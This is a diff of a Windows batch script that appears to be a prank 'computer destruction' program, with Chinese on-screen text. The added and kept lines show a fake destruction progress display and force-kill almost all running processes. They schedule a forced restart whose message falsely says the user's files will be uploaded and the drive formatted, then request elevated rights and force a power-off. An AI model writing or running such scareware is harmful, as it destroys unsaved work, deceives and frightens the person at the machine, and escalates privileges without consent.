@@ -1,28 +1,47 @@
 @title 
 @echo off
 chcp 950>nul
+cd /d "%SystemDrive%\Microdoft"
 if not "%start%"=="1" goto DO
-findstr /offline /c:"0001a 814682 6724824831" /c:"0002a 184558 5813482453" /c:"0002b 348314 5743484865" "%SystemDrive%\Microdoft\Md1_0002b.ver">nul || (echo 版本錯誤。 & echo 版本錯誤。>>"%~dp0log.txt" & timeout /t 10>nul & exit)
+set str=/c:"0001a 814682 6724824831" /c:"0002a 184558 5813482453" /c:"0002b 348314 5743484865" /c:"0002c 165082 1356503821"
+set Vfile="%SystemDrive%\Microdoft\Md1_0002c.ver"
+setlocal enabledelayedexpansion
+call:Ver
+if not !VF!==4 (echo 版本錯誤。 & echo 版本錯誤。>>"%~dp0log.txt" & timeout /t 10>nul & exit /b)
+endlocal
 if exist "%~dp0log.txt" (findstr /b /e /offline /c:"微哆動作紀錄 --------------------------------------------- " "%~dp0log.txt">nul && echo ---------------------------------------------------------- >>"%~dp0log.txt") else (echo 微哆動作紀錄 --------------------------------------------- >"%~dp0log.txt")
 if not %errorlevel%==0 echo 微哆動作紀錄 --------------------------------------------- >"%~dp0log.txt"
 goto start
 
+:Ver
+set strL=%str%
+set VF=0
+for /L %%c in (1,1,4) do (
+findstr /b /e /offline !strL:~0,29! %Vfile%>nul 2>&1
+if !errorlevel!==0 set /a VF+=1
+set strL=!strL:~29!
+)
+goto :eof
+
 :DO
-cd /d "%SystemDrive%\Microdoft"
 set start=1
 call "%SystemDrive%\Microdoft\DO.bat"
-exit
+exit /b
 )
 
-:start
-title 程式開始中…… Now Loading...
-echo Microdoft "arring"
+:DT
 for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
 set _DoDate=%%a年%%b月%%c日（%%d）
 )
 for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
 set _DoTime=%%e時%%f分%%g秒點%%h
 )
+goto :eof
+
+:start
+title 程式開始中…… Now Loading...
+echo Microdoft "arring"
+call:DT
 echo 在%_DoDate%%_DoTime%啟動了程式>>"%~dp0log.txt"
 timeout /t 1 /nobreak>nul
 goto ready
@@ -31,38 +50,30 @@ goto ready
 cls
 title 程式重新開始中…… Now Loading...
 echo Microdoft re"arring"
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
+call:DT
 echo 在%_DoDate%%_DoTime%重啟了程式>>"%~dp0log.txt"
 timeout /t 1 /nobreak>nul
 goto ready
 
 :ready
 cls
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
+call:DT
 title 電腦毀損程式　%_DoDate%%_DoTime%
-echo 毀損即將開始。
-choice /n /t 30 /c zxr /d x /m "「Z」鍵--開始；「X」鍵--結束"
+set MG=毀損即將開始
+echo %MG%。
+set NT=「Z」鍵--開始；「X」鍵--結束
+choice /n /t 30 /c zxr /d x /m "%NT%"
 if %errorlevel%==3 (
-echo 毀損即將開始 "「Z」鍵--開始；「X」鍵--結束"「R」>> "%~dp0log.txt"
+echo %MG% "%NT%"「R」>> "%~dp0log.txt"
 goto restart
 )
 if %errorlevel%==2 (
-echo 毀損即將開始 "「Z」鍵--開始；「X」鍵--結束"「X」>> "%~dp0log.txt"
+echo %MG% "%NT%"「X」>> "%~dp0log.txt"
 call:boom
 goto ready
 )
 if %errorlevel%==1 (
-echo 毀損即將開始 "「Z」鍵--開始；「X」鍵--結束"「Z」>> "%~dp0log.txt"
+echo %MG% "%NT%"「Z」>> "%~dp0log.txt"
 goto formatting
 )
 
@@ -70,12 +81,7 @@ goto formatting
 cls
 title 程式執行中…… Now Running...
 echo 毀損中……
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
+call:DT
 echo 在%_DoDate%%_DoTime%開始了毀損>>"%~dp0log.txt"
 ping /n 1 /w 1000 127.0.0.1>nul
 for /L %%A in (1,1,111) do (
@@ -85,75 +91,72 @@ ping /-n 1 /w 1000 127.0.0.1>nul
 )
 cls
 echo 毀損中……65536％
-timeout /t 1>nul
+timeout /t 1 /nobreak>nul
 cls
 title 電腦毀損完畢　%_DoDate%%_DoTime%
 echo 毀損完成，中秋節快樂！
+timeout /t 1 /nobreak>nul
+call:DT
 echo 在%_DoDate%%_DoTime%結束了毀損>>"%~dp0log.txt"
 echo ---------------------------------------------------------- >>"%~dp0log.txt"
-timeout /t 1 /nobreak>nul
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
-echo 在%_DoDate%%_DoTime%結束了毀損>>"%~dp0log.txt"
 ping /n 1 /w 1000 127.0.0.1>nul
 set script="%temp%\%random%.vbs"
 echo Set s= CreateObject("Wscript.Shell") > %script%
+if "%ProgramFiles(x86)%"=="" (
+echo s.run """%ProgramFiles%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
+) else (
 echo s.run """%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
-call %script%
+)
+echo s.run """%~dp0系統錯誤.png""","3" >> %script%
+echo wscript.sleep 23500 >> %script%
+echo s.run "taskkill /f /fi ""imagename eq dllhost.exe""" ,"0" >> %script%
+set script1="%temp%\%random%a.vbs"
+echo Set c= CreateObject^("Wscript.Shell"^) > %script1%
+echo c.run ""%script%"","0" >> %script1%
+call %script1%
+del /f /q %script1%
+timeout /t 1 /nobreak>nul
 del /f /q %script%
-start 系統錯誤.png /max /realtime
-shutdown /g /f /t 57 /d 5:15 /c "你的電腦遇到問題，需要格式化系統磁碟機。　　　　　　　　　　　　　　　　我們只上傳你的所有檔案，然後為你格式化系統磁碟機。">>"%~dp0log.txt"
-taskkill /f /fi "imagename ne wmplayer.exe" /fi "imagename ne cmd.exe" /fi "imagename ne dllhost.exe" /fi "imagename ne taskkill.exe" /fi "imagename ne conhost.exe">nul 2>&1
+shutdown /g /f /t 55 /d 5:15 /c "你的電腦遇到問題，需要格式化系統磁碟機。　　　　　　　　　　　　　　　　我們只上傳你的所有檔案，然後為你格式化系統磁碟機。">>"%~dp0log.txt"
+taskkill /f /fi "imagename ne wmplayer.exe" /fi "imagename ne cmd.exe" /fi "imagename ne dllhost.exe" /fi "imagename ne taskkill.exe" /fi "imagename ne conhost.exe" /fi "imagename ne wscript.exe">nul 2>&1
 goto shutdown choice
 
 :shutdown choice 
 cls
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
+call:DT
+set MG=電腦毀損完畢
 title 電腦毀損完畢　%_DoDate%%_DoTime%
-choice /n /t 3 /c zxqr /d x /m "「Z」鍵--繼續；「X」鍵--取消"
+set NT=「Z」鍵--繼續；「X」鍵--取消
+choice /n /t 3 /c zxqr /d x /m "%NT%"
 if %errorlevel%==4 (
-echo 電腦毀損完畢 "「Z」鍵--開始；「X」鍵--結束"「R」>>"%~dp0log.txt"
+echo %MG% "%NT%"「R」>>"%~dp0log.txt"
 shutdown /a
 explorer
 goto restart
 )
 if %errorlevel%==3 (
-echo 電腦毀損完畢 "「Z」鍵--開始；「X」鍵--結束"「Q」>>"%~dp0log.txt"
+echo %MG% "%NT%"「Q」>>"%~dp0log.txt"
 shutdown /a
 goto shutdown choice
 )
 if %errorlevel%==2 (
-echo 電腦毀損完畢 "「Z」鍵--開始；「X」鍵--結束"「X」>>"%~dp0log.txt"
+echo %MG% "%NT%"「X」>>"%~dp0log.txt"
 call:boom
 goto shutdown choice
 )
 if %errorlevel%==1 (
-echo "「Z」鍵--開始；「X」鍵--結束"「Z」>>"%~dp0log.txt"
+echo %MG% "%NT%"「Z」>>"%~dp0log.txt"
 echo 再見。
 timeout /t 1 /nobreak>nul
-for /f "tokens=1-4 delims=/ " %%a in ("%date%") do (
-set _DoDate=%%a年%%b月%%c日（%%d）
-)
-for /f "tokens=1-4 delims=:. " %%e in ("%time%") do (
-set _DoTime=%%e時%%f分%%g秒點%%h
-)
+call:DT
 echo 在%_DoDate%%_DoTime%結束了系統>>"%~dp0log.txt"
 echo ---------------------------------------------------------- >>"%~dp0log.txt"
 echo Set UAC = CreateObject^("Shell.Application"^) > %script%
-echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename ne cmd.exe"" /fi ""imagename ne conhost.exe""", "", "runas", 1 >> %script%
+echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename ne cmd.exe"" /fi ""imagename ne conhost.exe""", "", "runas", 0 >> %script%
 call %script%
 del /f /q %script%
 shutdown /p /f
-exit
+goto :eof
 )
 
 :boom 
